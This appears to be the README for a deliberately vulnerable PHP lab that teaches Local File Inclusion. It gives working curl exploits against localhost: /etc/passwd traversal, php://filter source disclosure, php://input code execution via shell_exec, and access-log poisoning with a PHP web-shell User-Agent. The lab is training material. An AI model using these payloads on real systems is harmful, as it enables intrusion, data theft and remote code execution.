# lfi-basic

The companion lab for TechEarl's Local File Inclusion / Path Traversal article. A small PHP 8.2 app with two intentionally-vulnerable include() endpoints, configured with the unsafe `php.ini` settings (`allow_url_include=On`, `display_errors=On`) that turn classic LFI into source disclosure and remote code execution.

## Endpoints

| Endpoint | Vulnerable parameter | Sink shape |
|---|---|---|
| `/view.php?page=about` | `page` | `include('pages/' . $_GET['page'] . '.php')`, suffix appended |
| `/view-raw.php?page=pages/about.php` | `page` | `include($_GET['page'])`, raw, no suffix |

The two sinks exist side by side so the article can contrast what the `.php` suffix actually blocks (textbook `/etc/passwd` read against `view.php`) against what it does not block (the two PHP-wrapper attacks, which both ignore the trailing string).

## Running

```bash
docker compose up lfi-basic
```

From the root of the `techearl-labs` repo. Lab listens on <http://localhost:8084>.

(Until the root `docker-compose.yml` is updated to register the service, see `docker-compose.snippet.yml` in this directory for the block to append.)

## Expected exploit paths

### 1. Classic LFI against the raw sink

`/view-raw.php` passes `$_GET['page']` straight to `include()` with no suffix. The textbook traversal works directly:

```bash
curl 'http://localhost:8084/view-raw.php?page=../../../../etc/passwd'
```

The response renders `/etc/passwd` inline inside the page panel. Files with no `<?php` tag are echoed verbatim by `include()`, which is why the password file appears as plain text.

The null-byte truncation trick (`%00`) does NOT work against `/view.php` on PHP 8.2 (fixed in PHP 5.3.4). The lab is on PHP 8.2 deliberately so the article can document the trick as historical and pivot to the wrappers as the modern equivalents.

### 2. php://filter source disclosure against view.php

`view.php` appends `.php` to the requested name, so the naive `/etc/passwd` read fails. The `php://filter` wrapper sidesteps the suffix because everything after the `resource=` argument is ignored:

```bash
curl 'http://localhost:8084/view.php?page=php://filter/convert.base64-encode/resource=index'
```

The response contains the base64-encoded source of `index.php`. Decode it locally:

```bash
curl -s 'http://localhost:8084/view.php?page=php://filter/convert.base64-encode/resource=index' \
  | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d
```

Repeat against `view`, `view-raw`, `shared/layout` to pull every PHP source file the application ships. Source disclosure exposes secrets, hard-coded credentials, and the precise sink shapes needed to weaponise other endpoints.

### 3. php://input remote code execution against view.php

With `allow_url_include=On` (set by the lab's `php.ini` override) the `php://input` wrapper reads the POST body as PHP source and executes it. The suffix `view.php` appends is irrelevant to the wrapper.

```bash
curl -X POST --data '<?php echo shell_exec("id"); ?>' \
  'http://localhost:8084/view.php?page=php://input'
```

The response includes the output of `id` (`uid=33(www-data) gid=33(www-data) ...`). Any PHP can run, not just `shell_exec`: file write, reverse shell, persistent webshell, database egress, anything available to the `www-data` process inside the container.

This is the worst-case LFI outcome: a single GET parameter and a single POST body produce unauthenticated RCE. It only fires because `allow_url_include` was explicitly turned on; production servers should leave it Off (the default).

### 4. Log poisoning into RCE against view-raw.php

`/var/log/apache2/access.log` records every request, including the `User-Agent` header verbatim. Inject PHP into the User-Agent on any request:

```bash
curl -A '<?php system($_GET[0]); ?>' http://localhost:8084/
```

The log file now contains a real PHP tag. Include the log via the raw LFI sink and pass a command in the `0` query parameter:

```bash
curl 'http://localhost:8084/view-raw.php?page=../../../../var/log/apache2/access.log&0=id'
```

The injected `<?php ... ?>` block is parsed and executed when `include()` reaches it, and `$_GET[0]` carries the command. The same attack works against `/var/log/apache2/error.log` (404 paths get logged with their request line), `/proc/self/environ` on older kernels, and any other process-writable file the attacker can taint.

The lab's Dockerfile adds `www-data` to the `adm` group so the `0640 root:adm` access log is readable by the PHP process. Without that change the log-poisoning chain fails with permission-denied; with it, the chain succeeds. Real deployments that grant log-read for "debug dashboards" reproduce this exact misconfiguration.

## Verifying it is up

```bash
# Home page renders
curl -s http://localhost:8084/ | grep -c 'lfi-basic'

# Intended use works
curl -s 'http://localhost:8084/view.php?page=about' | grep -c '<h2>About</h2>'

# Confirm the raw LFI sink reaches outside the docroot
curl -s 'http://localhost:8084/view-raw.php?page=../../../../etc/passwd' | grep -c 'root:x:0:0'
```

If the third command returns `1`, the lab is wired correctly.

## Tearing down

```bash
docker compose down
```

No named volumes are mounted, so a plain `down` is enough; nothing persists between runs.

## Safety

Bound to `127.0.0.1` by default. Do not expose this container to a public interface. Every defence-in-depth setting that would make a real PHP server safe (`allow_url_include=Off`, `display_errors=Off`, log files unreadable by the web user, input validation on the include path) has been intentionally turned off here. The container will be exploited within minutes of being reachable from the internet.
